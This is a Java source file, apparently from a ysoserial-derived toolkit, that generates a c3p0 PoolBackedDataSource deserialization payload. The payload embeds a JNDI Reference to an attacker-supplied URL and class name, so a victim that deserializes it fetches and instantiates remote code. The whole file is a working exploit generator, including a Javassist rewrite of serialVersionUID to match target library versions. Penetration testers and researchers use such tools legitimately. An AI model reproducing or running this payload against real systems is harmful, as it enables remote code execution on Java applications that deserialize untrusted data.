package cn.butler.yso.payloads;


import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.PayloadRunner;
import cn.butler.yso.JavassistClassLoader;
import cn.butler.yso.payloads.util.Reflections;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import cn.butler.payloads.annotation.Authors;
import cn.butler.payloads.annotation.Dependencies;
import cn.butler.payloads.annotation.PayloadTest;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;


/**
 *
 *
 * com.sun.jndi.rmi.registry.RegistryContext->lookup
 * com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized->getObject
 * com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase->readObject
 *
 * Arguments:
 * - base_url:classname
 *
 * Yields:
 * - Instantiation of remotely loaded class
 *
 * @author mbechler
 *
 */
@PayloadTest ( harness="ysoserial.test.payloads.RemoteClassLoadingTest" )
@Dependencies( { "com.mchange:c3p0:0.9.2-pre2-RELEASE ~ 0.9.5-pre8" ,"com.mchange:mchange-commons-java:0.2.11"} )
@Authors({ Authors.MBECHLER,Authors.C0NY1 })
public class C3P02_c3p0 implements ObjectPayload<Object> {
    public Object getObject ( String command ) throws Exception {
        int sep = command.lastIndexOf('|');
        if ( sep < 0 ) {
            throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
        }

        String url = command.substring(0, sep);
        String className = command.substring(sep + 1);
        // 修改com.mchange.v2.c3p0.PoolBackedDataSource serialVerisonUID
        ClassPool pool = new ClassPool();
        pool.insertClassPath(new ClassClassPath(Class.forName("com.mchange.v2.c3p0.PoolBackedDataSource")));
        final CtClass ctPoolBackedDataSource = pool.get("com.mchange.v2.c3p0.PoolBackedDataSource");

        try {
            CtField ctSUID = ctPoolBackedDataSource.getDeclaredField("serialVersionUID");
            ctPoolBackedDataSource.removeField(ctSUID);
        }catch (javassist.NotFoundException e){}
        ctPoolBackedDataSource.addField(CtField.make("private static final long serialVersionUID = 7387108436934414104L;", ctPoolBackedDataSource));

        // mock method name until armed
        final Class clsPoolBackedDataSource = ctPoolBackedDataSource.toClass(new JavassistClassLoader());

        Object b = Reflections.createWithoutConstructor(clsPoolBackedDataSource);
        Reflections.getField(clsPoolBackedDataSource, "connectionPoolDataSource").set(b, new PoolSource(className, url));
        return b;
    }


    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private String className;
        private String url;

        public PoolSource ( String className, String url ) {
            this.className = className;
            this.url = url;
        }

        public Reference getReference () throws NamingException {
            return new Reference("exploit", this.className, this.url);
        }

        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(C3P02_c3p0.class, args);
    }

}
